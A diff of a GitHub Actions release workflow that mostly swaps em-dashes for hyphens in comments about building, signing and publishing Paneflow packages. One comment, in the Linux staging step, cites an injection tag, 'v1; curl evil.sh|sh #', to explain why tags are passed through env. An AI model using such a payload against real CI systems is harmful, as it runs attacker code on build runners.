@@ -35,7 +35,7 @@ permissions:
 
 # Serialize releases by ref. A tag-push race (or a dry-run launched on
 # top of a real tag) shouldn't double-publish or interrupt a half-baked
-# upload — `cancel-in-progress: false` lets the first run finish
+# upload - `cancel-in-progress: false` lets the first run finish
 # atomically. Grouped by `ref_name` so different tags don't block each
 # other. Mirrors Zed's release.yml pattern.
 concurrency:
@@ -83,7 +83,7 @@ jobs:
     # in case a future best-effort leg needs reintroducing.
     continue-on-error: ${{ matrix.continue-on-error == true }}
     strategy:
-      # fail-fast: true keeps the cross-arch Linux matrix atomic — a broken
+      # fail-fast: true keeps the cross-arch Linux matrix atomic - a broken
       # aarch64 Linux build cancels the x86_64 leg and vice versa, so we
       # never ship a half-matrix Linux release. The macOS Intel leg below
       # opts OUT of this via `continue-on-error: true` (AC5): a best-effort
@@ -94,7 +94,7 @@ jobs:
           - target: x86_64-unknown-linux-gnu
             arch: x86_64
             runs-on: ubuntu-22.04
-          # Hosted ARM runner (in GitHub public preview since late 2024) —
+          # Hosted ARM runner (in GitHub public preview since late 2024) -
           # explicitly NOT `cross` and NOT QEMU, matching Zed's own
           # `bundle_linux_aarch64` pattern. Spike evidence:
           # tasks/spike-aarch64-build.md.
@@ -108,7 +108,7 @@ jobs:
           # strips the leading `v` before feeding it to Info.plist
           # (CFBundleShortVersionString requires bare semver).
           #
-          # Hard-required since 2026-05-27 — signing has been live since
+          # Hard-required since 2026-05-27 - signing has been live since
           # v0.2.9-rc.4 (see memory/project_macos_signing.md) and the
           # last 3 stable cuts (v0.3.1/v0.3.2/v0.3.3) all shipped this
           # leg green. The previous `continue-on-error: true` posture
@@ -118,10 +118,10 @@ jobs:
           - target: aarch64-apple-darwin
             arch: aarch64
             runs-on: macos-14
-          # x86_64-pc-windows-msvc — OPEN since 2026-06-14. Azure Artifact
+          # x86_64-pc-windows-msvc - OPEN since 2026-06-14. Azure Artifact
           # Signing is provisioned for the Strivex subscription (account
           # strivex-signing, cert profile StriveX-Release; the 6 AZURE_*
-          # secrets are set — see memory/project_windows_signing.md).
+          # secrets are set - see memory/project_windows_signing.md).
           # best-effort (continue-on-error) for the first cuts; promote to
           # hard-required after 2-3 green Windows releases. The historical
           # closure note is kept further down for context.
@@ -129,7 +129,7 @@ jobs:
             arch: x86_64
             runs-on: windows-2022
             continue-on-error: true
-          # CLOSED TARGET — x86_64-apple-darwin (Intel Mac / macos-13)
+          # CLOSED TARGET - x86_64-apple-darwin (Intel Mac / macos-13)
           # Decision: 2026-04-21 (US-008, v0.2.1). Removed from the
           # matrix entirely until v0.3.0's macOS release cut. Two
           # blockers, either of which would have been enough on its
@@ -147,10 +147,10 @@ jobs:
           # refactor of the `Publish` job's `needs:` to not block on
           # best-effort legs. See docs/release-runbook.md §"Supported
           # release targets" for the authoritative status list.
-          # CLOSED TARGET — x86_64-pc-windows-msvc (Windows x64)
+          # CLOSED TARGET - x86_64-pc-windows-msvc (Windows x64)
           # Decision: 2026-05-27. Removed from the matrix entirely
           # until Azure Trusted Signing is provisioned for the
-          # Strivex subscription ($9.99/mo Basic — see
+          # Strivex subscription ($9.99/mo Basic - see
           # memory/project_windows_signing.md for the rotation +
           # secret-list and the post-onboarding restoration runbook).
           # Without a Code Signing Certificate the MSI built by this
@@ -217,13 +217,13 @@ jobs:
       # ship sips (Apple's built-in resizer) + iconutil out of the box, but
       # neither ships ImageMagick. scripts/build-icons.sh prefers `magick` for
       # multi-resolution .ico assembly, so install it here on the macOS leg only
-      # — the Linux leg picks up `imagemagick` via the apt-get block above and
+      # - the Linux leg picks up `imagemagick` via the apt-get block above and
       # the Windows leg uses the preinstalled copy.
       - name: Install ImageMagick (macOS)
         if: runner.os == 'macOS'
         run: brew install --quiet imagemagick
 
-      # US-002 AC3 — validate the AppStream metainfo XML before any packaging
+      # US-002 AC3 - validate the AppStream metainfo XML before any packaging
       # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
       # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
       # would ignore, and (b) block distro submission. Fail-fast here so a
@@ -302,7 +302,7 @@ jobs:
       # downstream artifact (tar.gz, .deb, .rpm, AppImage, .dmg, and the
       # cargo-wix MSI which consumes this build via `--no-build`). If the
       # secret is absent the startup log::warn! surfaces and events are
-      # silently dropped — never a user-facing failure.
+      # silently dropped - never a user-facing failure.
       - name: Build release binary
         env:
           POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
@@ -321,7 +321,7 @@ jobs:
       - name: Produce tar.gz
         if: runner.os == 'Linux'
         # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
-        # in the shell body — same injection-hardening rationale as the
+        # in the shell body - same injection-hardening rationale as the
         # AppImage step below (attacker-controlled tags must not reach bash
         # via GitHub Actions expression substitution).
         env:
@@ -351,7 +351,7 @@ jobs:
       - name: Produce .rpm
         if: runner.os == 'Linux'
         # `-p src-app` is the DIRECTORY path (relative to workspace root),
-        # not the crate name — cargo-generate-rpm 0.20.0 resolves `-p`
+        # not the crate name - cargo-generate-rpm 0.20.0 resolves `-p`
         # strictly as a path. `-p paneflow-app` fails with "No such file
         # or directory: paneflow-app/Cargo.toml".
         #
@@ -368,7 +368,7 @@ jobs:
       #
       # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
       # The earlier PRD draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
-      # but those produce incompatible signature formats — the verify
+      # but those produce incompatible signature formats - the verify
       # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
       # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
       # XML required).
@@ -377,7 +377,7 @@ jobs:
       # missing or malformed, the workflow exits NON-ZERO with the exact
       # AC-mandated string "GPG signing failed: key not loaded". No
       # silent-unsigned-release path. The release-creating step at the
-      # end of the job is downstream — it never runs if we exit here.
+      # end of the job is downstream - it never runs if we exit here.
       - name: Sign .deb and .rpm with release key
         if: runner.os == 'Linux'
         env:
@@ -395,7 +395,7 @@ jobs:
             exit 1
           fi
           # Require the full 40-char fingerprint. Short 16-char key IDs
-          # are collision-vulnerable (see https://evil32.com/) — an
+          # are collision-vulnerable (see https://evil32.com/) - an
           # attacker who could populate `GPG_KEY_ID` with a short ID
           # pointing at a rogue key would satisfy the later `grep -qi
           # "${GPG_KEY_ID}$"` fingerprint match against any key whose
@@ -415,10 +415,10 @@ jobs:
           echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
           gpgconf --kill gpg-agent || true
           # Import; if the private-key blob is malformed, `gpg --import`
-          # exits non-zero and `set -e` fails the step — the annotation
+          # exits non-zero and `set -e` fails the step - the annotation
           # above ensures the red X in PR check matches the AC contract.
           # `<<<` (bash herestring) passes the secret through a kernel
-          # pipe buffer, NOT through argv — so it never appears in
+          # pipe buffer, NOT through argv - so it never appears in
           # `/proc/<pid>/cmdline` of any intermediate process.
           if ! gpg --batch --import <<< "$GPG_PRIVATE_KEY" 2>&1; then
             echo "::error title=GPG signing::GPG signing failed: key not loaded"
@@ -439,7 +439,7 @@ jobs:
           # --- Prime the agent passphrase cache (only if passphrased) --
           # US-015 uses the same dummy-clearsign trick. If the key has no
           # passphrase (`%no-protection`), GPG_PASSPHRASE is empty and we
-          # skip — `gpg` accepts `--passphrase-file <(printf '')` as an
+          # skip - `gpg` accepts `--passphrase-file <(printf '')` as an
           # empty passphrase but it also ignores pinentry in that case.
           if [ -n "${GPG_PASSPHRASE:-}" ]; then
             printf 'prime' | gpg --batch --yes \
@@ -468,12 +468,12 @@ jobs:
           # with loopback pinentry. `%_gpg_name` tells it which key.
           #
           # Passphrase handling: rpmsign invokes `%__gpg_sign_cmd` via
-          # `/bin/sh -c`, which on Ubuntu is `dash` — and dash does NOT
+          # `/bin/sh -c`, which on Ubuntu is `dash` - and dash does NOT
           # support bash process substitution `<(...)`. So we can't inline
           # `--passphrase-file <(printf ...)` into the macro. Instead we
           # write the passphrase to a private 0600 temp file, reference
           # that path from the macro, and `trap` its cleanup. The temp
-          # file is on the runner's ephemeral tmpfs — same blast radius
+          # file is on the runner's ephemeral tmpfs - same blast radius
           # as the `.rpmmacros` file itself.
           PASS_FILE=$(mktemp)
           chmod 600 "$PASS_FILE"
@@ -482,7 +482,7 @@ jobs:
 
           # Override `%__gpg` directly (NOT `%_gpgbin`). On Ubuntu 22.04
           # the default `/usr/lib/rpm/macros` sets `%__gpg` to
-          # `/usr/bin/gpg2` — a Fedora-ism that does not exist on
+          # `/usr/bin/gpg2` - a Fedora-ism that does not exist on
           # Debian-family systems, where GnuPG 2.2+ ships as the
           # unified `/usr/bin/gpg` binary. Setting only `%_gpgbin` is
           # NOT enough (rpm ignores it during macro expansion of
@@ -525,7 +525,7 @@ jobs:
 
           # --- Sign all .rpm files -------------------------------------
           # `rpmsign --addsign` embeds the signature in the RPM header
-          # using the macros above. No per-invocation flags — everything
+          # using the macros above. No per-invocation flags - everything
           # is controlled by ~/.rpmmacros.
           #
           # Glob note: cargo-generate-rpm emits `.x86_64.rpm` and
@@ -552,7 +552,7 @@ jobs:
           # pass/fail signal. Both `dpkg-sig --verify` and `rpm
           # --checksig` exit 0 iff every signature component is OK, and
           # non-zero otherwise. Verbose output is tee'd to a log for CI
-          # debugging but is NOT grepped — the output format varies
+          # debugging but is NOT grepped - the output format varies
           # across versions (modern rpm ≥4.17 emits "Header V4 RSA/SHA256
           # Signature, key ID ...: OK" while older rpm emits "pgp md5
           # OK"; dpkg-sig keeps GOODSIG stable but why couple to strings
@@ -562,16 +562,16 @@ jobs:
           # `rpm --checksig` can verify. Use a USER-SCOPED DB via
           # `--dbpath` instead of the system DB at `/var/lib/rpm`:
           #
-          # 1. No sudo needed — avoids the `sudo rpm --import /dev/stdin`
+          # 1. No sudo needed - avoids the `sudo rpm --import /dev/stdin`
           #    subprocess-stdin-reopen bug (rpm#3740) AND avoids any
           #    silent-failure on Ubuntu's `rpm` package, which ships
           #    without an initialized `/var/lib/rpm/Packages` db (v0.2.1
           #    retry #1 surface: rpmsign signed OK, dpkg-sig verified OK,
           #    but `rpm --checksig` returned NOKEY for key ID 183f2711
           #    despite `sudo rpm --import` running to silent-success).
-          # 2. Fully isolated — cleaned up by the trap at EXIT along with
+          # 2. Fully isolated - cleaned up by the trap at EXIT along with
           #    PASS_FILE and PUBKEY_FILE. No state leaks into the runner.
-          # 3. Cross-distro portable — the same `--dbpath "$RPM_DB"`
+          # 3. Cross-distro portable - the same `--dbpath "$RPM_DB"`
           #    arguments work on Fedora / RHEL / openSUSE runners too if
           #    we ever add them to the matrix.
           PUBKEY_FILE=$(mktemp --suffix=.asc)
@@ -581,13 +581,13 @@ jobs:
           gpg --armor --export "$GPG_KEY_ID" > "$PUBKEY_FILE"
           rpm --dbpath "$RPM_DB" --initdb
           rpm --dbpath "$RPM_DB" --import "$PUBKEY_FILE"
-          # Sanity-check the import actually landed — failure mode on
+          # Sanity-check the import actually landed - failure mode on
           # rpm 4.17 is silent (exit 0 + empty keyring). The signing key
           # fingerprint's last 8 hex chars lowercased are what rpm uses
           # for the gpg-pubkey-<keyid>-<creation> package name.
           KEY_SHORT=$(echo "$GPG_KEY_ID" | tail -c9 | tr 'A-F' 'a-f')
           # rpm -qa with a pattern matches the NAME column only. gpg-pubkey
-          # packages all share the name "gpg-pubkey" — the key-id lives in
+          # packages all share the name "gpg-pubkey" - the key-id lives in
           # the Version-Release ("gpg-pubkey-<keyid>-<creation>"). So the
           # pattern `"gpg-pubkey-${KEY_SHORT}*"` matches NOTHING even when
           # the key is present (v0.2.1 retry #2 surface: keyring dump
@@ -603,7 +603,7 @@ jobs:
           # `${PIPESTATUS[0]}` reads the exit code of the FIRST command
           # in a bash pipeline, independent of `tee`'s exit code. Using
           # `set -o pipefail` wouldn't work here because `tee` always
-          # exits 0 on successful writes — we need the verify tool's
+          # exits 0 on successful writes - we need the verify tool's
           # own status, not the pipeline's composite status.
           for deb in target/"${TARGET}"/debian/paneflow_*.deb; do
             [ -f "$deb" ] || continue
@@ -617,7 +617,7 @@ jobs:
           # US-001 (v0.2.1): verify every signed .rpm with
           # `rpm --checksig -v`. Exits 0 iff every signature component is
           # OK (Header V4 RSA/SHA256, Header SHA1, Payload, MD5). Any
-          # NOKEY/BAD bubbles up as non-zero and fails the release — no
+          # NOKEY/BAD bubbles up as non-zero and fails the release - no
           # silent-unsigned-rpm path. `PIPESTATUS[0]` reads rpm's own
           # status, independent of `tee`'s always-0 exit.
           for rpm_path in target/"${TARGET}"/generate-rpm/paneflow-*.rpm; do
@@ -633,7 +633,7 @@ jobs:
       - name: Produce AppImage
         if: runner.os == 'Linux'
         # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
-        # in the shell body — same injection-hardening rationale as the
+        # in the shell body - same injection-hardening rationale as the
         # staging step below (attacker-controlled tags must not reach bash
         # via expression substitution).
         env:
@@ -647,7 +647,7 @@ jobs:
 
       # ─── US-019 macOS .app assembly ──────────────────────────────────
       # Mirrors the run_tests.yml Xcode preflight (kept intentionally duplicated
-      # — a drift here, e.g. an old runner image missing the Metal
+      # - a drift here, e.g. an old runner image missing the Metal
       # toolchain, surfaces as a labelled preflight failure rather than a
       # cryptic mid-compile error).
       - name: Verify Xcode CLT + Metal toolchain (macOS)
@@ -668,7 +668,7 @@ jobs:
           fi
 
           if ! xcrun --find metal >/dev/null 2>&1; then
-            echo "::error::Metal compiler not available — gpui_macos compiles .metal shaders and will fail without it."
+            echo "::error::Metal compiler not available - gpui_macos compiles .metal shaders and will fail without it."
             exit 1
           fi
 
@@ -702,12 +702,12 @@ jobs:
       #
       # Secrets used (must be populated in repo settings before the first
       # signed macOS release can ship; see docs/release/macos-signing.md):
-      #   APPLE_DEVELOPER_CERT_P12        — base64-encoded .p12
-      #   APPLE_DEVELOPER_CERT_PASSWORD   — password to decrypt the .p12
-      #   APPLE_ID                        — Apple Developer account email
-      #   APPLE_APP_SPECIFIC_PASSWORD     — app-specific password (not the
+      #   APPLE_DEVELOPER_CERT_P12        - base64-encoded .p12
+      #   APPLE_DEVELOPER_CERT_PASSWORD   - password to decrypt the .p12
+      #   APPLE_ID                        - Apple Developer account email
+      #   APPLE_APP_SPECIFIC_PASSWORD     - app-specific password (not the
       #                                     Apple ID password itself)
-      #   APPLE_TEAM_ID                   — 10-char team ID
+      #   APPLE_TEAM_ID                   - 10-char team ID
       #
       # US-023 AC7: when ANY Apple secret is missing the leg degrades to
       # an unsigned build instead of hard-failing. The "Detect macOS
@@ -741,10 +741,10 @@ jobs:
              && [ -n "${APPLE_ID:-}" ] \
              && [ -n "${APPLE_APP_SPECIFIC_PASSWORD:-}" ] \
              && [ -n "${APPLE_TEAM_ID:-}" ]; then
-              echo "All 5 Apple signing secrets are present — will sign + notarize."
+              echo "All 5 Apple signing secrets are present - will sign + notarize."
               echo "signing_available=true" >> "$GITHUB_OUTPUT"
           else
-              echo "::warning title=macOS signing skipped::One or more APPLE_* secrets are missing — emitting an UNSIGNED .app. See docs/release/macos-signing.md."
+              echo "::warning title=macOS signing skipped::One or more APPLE_* secrets are missing - emitting an UNSIGNED .app. See docs/release/macos-signing.md."
               echo "signing_available=false" >> "$GITHUB_OUTPUT"
           fi
 
@@ -763,7 +763,7 @@ jobs:
       - name: Notarize + staple macOS .app bundle
         if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
         # US-003 AC6: in dry-run mode a transient Apple Notary outage
-        # must not fail the entire leg — the release engineer still
+        # must not fail the entire leg - the release engineer still
         # wants the un-notarized .app + the Linux/Windows artifacts to
         # land in the workflow artifact bundle for inspection. In
         # tag-push mode this stays hard-required: shipping an
@@ -828,13 +828,13 @@ jobs:
 
       # ─── US-016 .dmg assembly ────────────────────────────────────────
       # Wraps the stapled .app in a drag-to-Applications .dmg. Zero new
-      # dependencies — hdiutil + osascript are built into macOS. Runs
+      # dependencies - hdiutil + osascript are built into macOS. Runs
       # *after* notarization so the enclosed bundle already carries its
       # Apple-issued stapled ticket.
       #
       # US-023 AC7 (publish-safety guard): `.dmg` production and staging
       # are gated on `steps.macos_signing.outputs.signing_available`. An
-      # unsigned `.app` MUST NOT reach the published GitHub Release —
+      # unsigned `.app` MUST NOT reach the published GitHub Release -
       # users would hit Gatekeeper "can't be opened" with no in-band
       # signal that the asset was published unsigned. When secrets are
       # absent the leg leaves the unsigned `.app` in `dist/` for local
@@ -883,7 +883,7 @@ jobs:
       # Detect whether the 6 Azure Trusted Signing secrets are populated
       # BEFORE any MSI/packaging step runs. When any are missing, every
       # subsequent Windows-only packaging step (Preflight WiX, Install
-      # cargo-wix, Produce MSI, Sign, Verify, Stage) is skipped — only
+      # cargo-wix, Produce MSI, Sign, Verify, Stage) is skipped - only
       # the cargo fmt / clippy / test / Build release binary validation
       # remains, which preserves cross-platform compile coverage without
       # noisy red failures from cargo-wix or unsigned-MSI artifacts.
@@ -891,7 +891,7 @@ jobs:
       # Routing: secrets go through env: so an unset secret resolves to
       # an empty string (not the literal `${{ secrets.NAME }}` placeholder
       # which would always look "present"). The 6 names match what
-      # `scripts/sign-windows.ps1` reads at runtime — see
+      # `scripts/sign-windows.ps1` reads at runtime - see
       # `memory/project_windows_signing.md` for the canonical list.
       - name: Detect Windows signing secrets
         id: windows_signing
@@ -912,17 +912,17 @@ jobs:
              && [ -n "${AZURE_TRUSTED_SIGNING_ENDPOINT:-}" ] \
              && [ -n "${AZURE_TRUSTED_SIGNING_ACCOUNT:-}" ] \
              && [ -n "${AZURE_TRUSTED_SIGNING_CERT_PROFILE:-}" ]; then
-              echo "All 6 Azure Trusted Signing secrets are present — will produce + sign + verify MSI."
+              echo "All 6 Azure Trusted Signing secrets are present - will produce + sign + verify MSI."
               echo "signing_available=true" >> "$GITHUB_OUTPUT"
           else
-              echo "::warning title=Windows MSI packaging skipped::One or more AZURE_* secrets are missing — skipping Preflight WiX / Install cargo-wix / Produce MSI / Sign / Verify / Stage. Build/test/clippy still run for cross-platform validation. See docs/release/windows-signing.md to enable."
+              echo "::warning title=Windows MSI packaging skipped::One or more AZURE_* secrets are missing - skipping Preflight WiX / Install cargo-wix / Produce MSI / Sign / Verify / Stage. Build/test/clippy still run for cross-platform validation. See docs/release/windows-signing.md to enable."
               echo "signing_available=false" >> "$GITHUB_OUTPUT"
           fi
 
       # ─── US-016 Windows MSI: toolchain preflight ─────────────────────────
       # Gated on `windows_signing.signing_available` (set above): when the
       # Azure secrets aren't populated yet, we don't bother with WiX or
-      # cargo-wix at all — the build/test/clippy validation above is what
+      # cargo-wix at all - the build/test/clippy validation above is what
       # we need for cross-platform coverage. Once the secrets land, this
       # whole chain re-activates without any other workflow change.
       #
@@ -930,12 +930,12 @@ jobs:
       # │ AC-4 of US-016 requires the Windows matrix entry to carry       │
       # │ `continue-on-error: true` (parity with Intel Mac, line 59), so  │
       # │ an Azure signing outage does not block Linux/macOS legs from    │
-      # │ publishing. Copy the Intel Mac entry pattern — do NOT omit.     │
+      # │ publishing. Copy the Intel Mac entry pattern - do NOT omit.     │
       # └─────────────────────────────────────────────────────────────────┘
       #
       # windows-2022 preinstalls WiX 3.14.1.8722. signtool.exe lives in
       # the Windows 10/11 SDK but is NOT resolved here: sign-windows.ps1
-      # does its own SDK scan (defense in depth — if the runner image
+      # does its own SDK scan (defense in depth - if the runner image
       # ever drops it, the script's clear error is better than a silent
       # PATH mismatch between this step and the script). Preflight only
       # handles WiX because cargo-wix errors are cryptic otherwise.
@@ -945,7 +945,7 @@ jobs:
         run: |
           # cargo-wix 0.3.9 needs candle.exe + light.exe. Preinstalled
           # on windows-2022 at C:\Program Files (x86)\WiX Toolset v3.14\bin\.
-          # v3.11 retained as a defensive fallback — if the image ever
+          # v3.11 retained as a defensive fallback - if the image ever
           # rolls back, emit a Write-Warning so the drift is visible in
           # the CI log rather than silently selecting an older toolset
           # that may emit subtly different MSIs.
@@ -955,17 +955,17 @@ jobs:
           )
           $wixBin = $wixRoots | Where-Object { Test-Path $_ } | Select-Object -First 1
           if (-not $wixBin) {
-              throw "WiX v3 not found under any known path. cargo-wix 0.3.9 requires WiX v3 (candle.exe/light.exe). Runner image may have dropped the preinstalled toolset — add an explicit install step (choco install wixtoolset --version 3.14.1)."
+              throw "WiX v3 not found under any known path. cargo-wix 0.3.9 requires WiX v3 (candle.exe/light.exe). Runner image may have dropped the preinstalled toolset - add an explicit install step (choco install wixtoolset --version 3.14.1)."
           }
           if ($wixBin -match 'v3\.11') {
-              Write-Warning "Falling back to WiX v3.11 — windows-2022 image normally ships v3.14. Verify runner-image changelog for a silent WiX downgrade."
+              Write-Warning "Falling back to WiX v3.11 - windows-2022 image normally ships v3.14. Verify runner-image changelog for a silent WiX downgrade."
           }
           Write-Output "Using WiX: $wixBin"
           Add-Content -Path $env:GITHUB_PATH -Value $wixBin
 
       # cargo-wix itself is NOT preinstalled on windows-2022. Pinned to
       # 0.3.9 (latest 2025-03 release; no 0.4.x exists yet that supports
-      # WiX v4 — tracked upstream as volks73/cargo-wix#202). The
+      # WiX v4 - tracked upstream as volks73/cargo-wix#202). The
       # Swatinem/rust-cache step above caches `~/.cargo/bin`, so this is
       # ~2 min cold / ~10 s cached.
       - name: Install cargo-wix (pinned)
@@ -976,13 +976,13 @@ jobs:
       # cargo-wix reads [package.metadata.wix] in src-app/Cargo.toml (US-013)
       # and `packaging/wix/main.wxs` to drive candle → light. The
       # `--install-version` flag overrides the MSI's ProductVersion with
-      # the bare semver (no leading `v`) — required because WiX's
+      # the bare semver (no leading `v`) - required because WiX's
       # ProductVersion schema rejects `v0.1.7` and accepts only `0.1.7`.
       #
       # Output: `target/wix/paneflow-<ver>-x86_64.msi`. The `--target`
       # flag tells cargo-wix which release binary to pick up
       # (`target/x86_64-pc-windows-msvc/release/paneflow.exe`) but the
-      # installer output directory is always `target/wix/` regardless —
+      # installer output directory is always `target/wix/` regardless -
       # do NOT assume the triple folder.
       - name: Produce MSI
         if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
@@ -1031,7 +1031,7 @@ jobs:
       # `Microsoft.ArtifactSigning.Client` NuGet (pinned 1.0.128) into a
       # temp dir, writes a metadata.json with ExcludeCredentials, and
       # calls `signtool.exe sign` with the 3-host timestamp retry chain
-      # (acs.microsoft.com → digicert → sectigo) — satisfying US-024 AC-3.
+      # (acs.microsoft.com → digicert → sectigo) - satisfying US-024 AC-3.
       # Verification (`signtool verify /pa` + `Get-AuthenticodeSignature`)
       # is embedded in the script; an additional standalone verify step
       # below makes it visible at the workflow level (AC-6).
@@ -1039,18 +1039,18 @@ jobs:
       # Why script-not-action (US-024 AC-1 reconciliation): the official
       # `azure/trusted-signing-action` is a thin wrapper around the same
       # `Microsoft.ArtifactSigning.Client` NuGet, but accepts only ONE
-      # `timestamp-rfc3161` URL — it cannot satisfy AC-3's 3-server
+      # `timestamp-rfc3161` URL - it cannot satisfy AC-3's 3-server
       # fallback chain. The script invokes the same official Microsoft
       # client at a lower level (signtool /dlib), and is therefore the
       # canonical Azure Trusted Signing integration here. See
       # `docs/release/windows-signing.md §"Why a script and not the
       # official action"` for the full rationale.
       #
-      # Secrets (all 6 required — populated per US-014 onboarding):
+      # Secrets (all 6 required - populated per US-014 onboarding):
       #   AZURE_TENANT_ID / AZURE_CLIENT_ID / AZURE_CLIENT_SECRET
-      #       — service principal for EnvironmentCredential auth
+      #       - service principal for EnvironmentCredential auth
       #   AZURE_TRUSTED_SIGNING_ENDPOINT / _ACCOUNT / _CERT_PROFILE
-      #       — addressing for the code-signing account / cert profile
+      #       - addressing for the code-signing account / cert profile
       #
       # AC-5: when `signing_available` is false the step is skipped; the
       # MSI still ships, unsigned, picked up by Stage Windows assets and
@@ -1081,7 +1081,7 @@ jobs:
           $msi = Get-ChildItem -Path 'target/wix' -Filter "paneflow-$version-*.msi" |
               Select-Object -First 1 -ExpandProperty FullName
           if (-not $msi) {
-              throw "No MSI found under target/wix/ matching paneflow-$version-*.msi — cargo wix build may have failed or emitted an unexpected filename."
+              throw "No MSI found under target/wix/ matching paneflow-$version-*.msi - cargo wix build may have failed or emitted an unexpected filename."
           }
           Write-Output "Signing: $msi"
           # Quoted "$msi" so a path with spaces (unlikely with cargo-wix
@@ -1090,7 +1090,7 @@ jobs:
 
       # ─── US-024 AC-6: Verify MSI signature at workflow level ─────────────
       # `sign-windows.ps1` already runs `signtool verify /pa /v` + an
-      # `Get-AuthenticodeSignature` Authenticode check internally — this
+      # `Get-AuthenticodeSignature` Authenticode check internally - this
       # step re-runs the bare `signtool verify /pa /v` so the verification
       # output is unambiguously visible at the workflow level (the
       # script's verify is buried inside its log section). AC-6 demands
@@ -1117,7 +1117,7 @@ jobs:
               throw "No MSI found under target/wix/ matching paneflow-$version-*.msi."
           }
 
-          # Resolve signtool the same way sign-windows.ps1 does — keep
+          # Resolve signtool the same way sign-windows.ps1 does - keep
           # the two paths in sync so a runner-image SDK change cannot
           # silently desynchronize them.
           $sdkRoot = 'C:\Program Files (x86)\Windows Kits\10\bin'
@@ -1152,7 +1152,7 @@ jobs:
           # in theory be tricked by a future signtool diagnostic that
           # echoes the phrase mid-sentence in an error path.
           if (-not ($verifyOutput -match '^\s*Successfully verified')) {
-              throw "signtool verify did not emit 'Successfully verified' — AC-6 sentinel missing."
+              throw "signtool verify did not emit 'Successfully verified' - AC-6 sentinel missing."
           }
           Write-Output "AC-6 sentinel 'Successfully verified' present."
 
@@ -1198,7 +1198,7 @@ jobs:
       #
       # Same env-routing hardening as the Linux/macOS stage steps: `TAG`
       # goes via the `env:` block, never inlined as `${{ ... }}` inside
-      # the shell body — so an attacker-controlled tag cannot shell-inject.
+      # the shell body - so an attacker-controlled tag cannot shell-inject.
       - name: Stage Windows assets
         if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
         shell: bash
@@ -1228,7 +1228,7 @@ jobs:
       # --- Stage all 4 artifacts with canonical names ---
       # Linux-leg-only: the macOS .dmg is staged by its own step above.
       # Context values are passed via `env:` rather than inlined as
-      # `${{ github.ref_name }}` inside the shell body — otherwise an
+      # `${{ github.ref_name }}` inside the shell body - otherwise an
       # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
       # shell-injected when bash parses the script. `env:` injects them
       # as environment variables, immune to shell interpretation.
@@ -1288,7 +1288,7 @@ jobs:
           #
           # Staying inside a single `cd release-assets` subshell keeps the
           # canonical coreutils output format `<64-hex>  <filename>` (no
-          # path prefix) — essential for `sha256sum -c <asset>.sha256` to
+          # path prefix) - essential for `sha256sum -c <asset>.sha256` to
           # work after a user downloads both files into the same directory.
           # `set -e` / `set -o pipefail` are inherited by the subshell, so
           # any single `sha256sum` failure aborts the chain and fails the
@@ -1317,7 +1317,7 @@ jobs:
 
       # Upload artifacts so the smoke-test jobs below can install them
       # in clean Ubuntu / Fedora containers. `compression-level: 0`
-      # — artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
+      # - artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
       - name: Upload release artifacts (for smoke-test jobs)
         uses: actions/upload-artifact@v4
         with:
@@ -1344,7 +1344,7 @@ jobs:
   # every matrix leg to finish. `fail-fast: true` + hard-required legs
   # (Linux x64/aarch64, macOS aarch64) propagate a failure to cancel
   # siblings and fail `build`, so this job never runs on a broken
-  # hard-required leg. Best-effort legs (Intel Mac, Windows — both
+  # hard-required leg. Best-effort legs (Intel Mac, Windows - both
   # `continue-on-error: true`) are excluded from `fail-fast`: a failure
   # there is allowed, the `build` job is still marked success, and the
   # release ships without those assets. This keeps the release-day
@@ -1364,7 +1364,7 @@ jobs:
     # `if:` expressions (only in step-level `if:`, in `with:`/`env:` of
     # steps, and in `continue-on-error:`). Use `github.event_name` +
     # `github.ref` directly. The `startsWith(...)` belt is required even
-    # though the workflow's only `push` trigger is `tags: ["v*"]` —
+    # though the workflow's only `push` trigger is `tags: ["v*"]` -
     # without it, any future addition of a `push: branches:` trigger
     # (e.g. for nightly artifacts) would silently start publishing real
     # GitHub Releases off branch pushes. Defence in depth, mirrors the
@@ -1434,17 +1434,17 @@ jobs:
       # clients can verify downloads against the public key baked into their
       # binary (update/signature.rs). The detached `.minisig` siblings are
       # picked up by `files: release-assets/*` below. No-op (with a CI warning)
-      # when the key is not yet provisioned — see docs/self-update-signing.md.
+      # when the key is not yet provisioned - see docs/self-update-signing.md.
       - name: Sign release artifacts (minisign)
         env:
           MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
         run: |
           set -euo pipefail
           if [ -z "${MINISIGN_SECRET_KEY}" ]; then
-            echo "::warning::MINISIGN_SECRET_KEY not set — release artifacts will be UNSIGNED. Clients with an embedded key will refuse to self-update from this release. Provision the key per docs/self-update-signing.md."
+            echo "::warning::MINISIGN_SECRET_KEY not set - release artifacts will be UNSIGNED. Clients with an embedded key will refuse to self-update from this release. Provision the key per docs/self-update-signing.md."
             exit 0
           fi
-          # minisign is NOT packaged in Ubuntu 22.04 (jammy) — it only enters
+          # minisign is NOT packaged in Ubuntu 22.04 (jammy) - it only enters
           # the archive in 24.04 (noble, universe). Install the upstream
           # static binary instead, pinned by version + SHA-256 so the signing
           # toolchain itself is tamper-evident (first executed 2026-06-10;
@@ -1465,7 +1465,7 @@ jobs:
           chmod 600 "$key_file"
           shopt -s nullglob
           for f in release-assets/*; do
-            # Skip checksum / signature / zsync siblings — only the primary
+            # Skip checksum / signature / zsync siblings - only the primary
             # artifacts (.tar.gz/.deb/.rpm/.AppImage/.dmg/.msi) are signed.
             case "$f" in
               *.sha256|*.minisig|*.zsync) continue ;;
@@ -1511,7 +1511,7 @@ jobs:
   # still load on Arch's current libxcb / libxkbcommon / libvulkan.
   #
   # AC5 (`fail-fast: false`) is satisfied by these jobs being separate
